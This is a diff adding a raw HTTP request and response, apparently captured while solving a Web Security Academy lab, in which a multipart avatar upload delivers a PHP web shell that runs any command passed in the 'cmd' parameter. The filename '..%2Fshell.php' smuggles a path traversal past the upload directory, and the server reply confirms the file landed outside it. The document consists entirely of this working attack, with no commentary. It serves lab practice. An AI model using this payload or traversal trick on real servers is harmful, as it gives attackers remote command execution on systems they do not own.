@@ -1,0 +1,47 @@
+POST https://0a9f00df04a067ea80359ee200750064.web-security-academy.net/my-account/avatar HTTP/1.1
+host: 0a9f00df04a067ea80359ee200750064.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------11749391891265851062630312699
+content-length: 545
+Origin: https://0a9f00df04a067ea80359ee200750064.web-security-academy.net
+Connection: keep-alive
+Referer: https://0a9f00df04a067ea80359ee200750064.web-security-academy.net/my-account?id=wiener
+Cookie: session=FU8ujse7oOdSXpocaDANy9dIr54W2RVy
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+
+-----------------------------11749391891265851062630312699
+Content-Disposition: form-data; name="avatar"; filename="..%2Fshell.php"
+Content-Type: application/x-php
+
+<?php
+    $cmd = $_GET['cmd'];
+    print(exec($cmd));
+?>
+-----------------------------11749391891265851062630312699
+Content-Disposition: form-data; name="user"
+
+wiener
+-----------------------------11749391891265851062630312699
+Content-Disposition: form-data; name="csrf"
+
+64XwXkYwqbszEyYHP41vpyX9p7Ep2XnY
+-----------------------------11749391891265851062630312699--
+HTTP/1.1 200 OK
+Date: Sat, 26 Oct 2024 13:41:34 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Keep-Alive: timeout=5, max=100
+Connection: close
+Content-Type: text/html; charset=UTF-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 133
+
+The file avatars/../shell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
